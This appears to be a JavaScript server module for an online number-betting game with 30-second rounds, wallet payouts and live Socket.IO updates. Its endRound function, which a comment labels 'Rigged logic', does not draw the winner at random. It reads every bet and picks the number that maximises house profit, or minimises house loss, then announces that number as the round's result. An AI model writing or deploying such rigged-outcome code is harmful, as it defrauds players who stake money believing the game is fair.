const Round = require('../models/Round');
const Bet = require('../models/Bet');
const User = require('../models/User');

let currentRound = null;
let io = null;

const initGameEngine = (socketIo) => {
    io = socketIo;
    startNewRound();
};

const startNewRound = async () => {
    try {
        const lastRound = await Round.findOne().sort({ roundNumber: -1 });
        const roundNumber = lastRound ? lastRound.roundNumber + 1 : 1;

        const startTime = new Date();
        const endTime = new Date(startTime.getTime() + 30000); // 30 seconds

        currentRound = await Round.create({
            roundNumber,
            startTime,
            endTime,
            status: 'open',
        });

        console.log(`Starting Round ${roundNumber}`);
        io.emit('newRound', {
            roundId: currentRound._id,
            roundNumber: currentRound.roundNumber,
            startTime: currentRound.startTime,
            endTime: currentRound.endTime,
        });

        // Run countdown
        let timeLeft = 30;
        const timer = setInterval(() => {
            timeLeft--;
            io.emit('timer', timeLeft);

            if (timeLeft <= 0) {
                clearInterval(timer);
                endRound();
            }
        }, 1000);
    } catch (error) {
        console.error('Error starting new round:', error);
    }
};

const endRound = async () => {
    try {
        currentRound.status = 'closed';
        await currentRound.save();

        // Give a 500ms grace period for any last-millisecond bets to finish writing to DB
        setTimeout(async () => {
            const bets = await Bet.find({ roundId: currentRound._id });
            const totalBet = bets.reduce((sum, bet) => sum + bet.amount, 0);

            // Group bets by number
            const numberBets = {};
            for (let i = 0; i <= 9; i++) {
                numberBets[i] = 0;
            }
            bets.forEach(bet => {
                numberBets[bet.number] += bet.amount;
            });

            // Calculate potential payouts for each number
            const payouts = {};
            for (let i = 0; i <= 9; i++) {
                payouts[i] = numberBets[i] * 2;
            }

            // Rigged logic: Choose a number where payout <= totalBet and house profit is maximized
            let winningNumber = 0;
            let maxProfit = -Infinity;

            // Collect all "safe" numbers (payout <= totalBet)
            const safeNumbers = [];
            for (let i = 0; i <= 9; i++) {
                if (payouts[i] <= totalBet) {
                    safeNumbers.push(i);
                }
            }

            if (safeNumbers.length > 0) {
                // Pick the one with max profit among safe ones
                safeNumbers.forEach(num => {
                    const profit = totalBet - payouts[num];
                    if (profit > maxProfit) {
                        maxProfit = profit;
                        winningNumber = num;
                    }
                });
            } else {
                // If no safe number, pick the one with MINIMUM payout to minimize loss
                let minPayout = Infinity;
                for (let i = 0; i <= 9; i++) {
                    if (payouts[i] < minPayout) {
                        minPayout = payouts[i];
                        winningNumber = i;
                    }
                }
            }

            // Update round with results
            currentRound.winningNumber = winningNumber;
            currentRound.totalBetAmount = totalBet;
            currentRound.totalPayout = payouts[winningNumber];
            await currentRound.save();

            // Process winners
            const winningBets = bets.filter(bet => bet.number === winningNumber);
            for (const bet of winningBets) {
                bet.isWinner = true;
                bet.payout = bet.amount * 2;
                await bet.save();

                const user = await User.findById(bet.user);
                user.walletBalance += bet.payout;
                await user.save();
            }

            io.emit('roundResult', {
                winningNumber,
                totalBet,
                totalPayout: payouts[winningNumber],
            });

            console.log(`Round ${currentRound.roundNumber} ended. Winner: ${winningNumber}`);

            // Wait 5 seconds before starting next round
            setTimeout(startNewRound, 5000);
        }, 500);
    } catch (error) {
        console.error('Error ending round:', error);
    }
};

const getCurrentRound = () => currentRound;

module.exports = { initGameEngine, getCurrentRound };
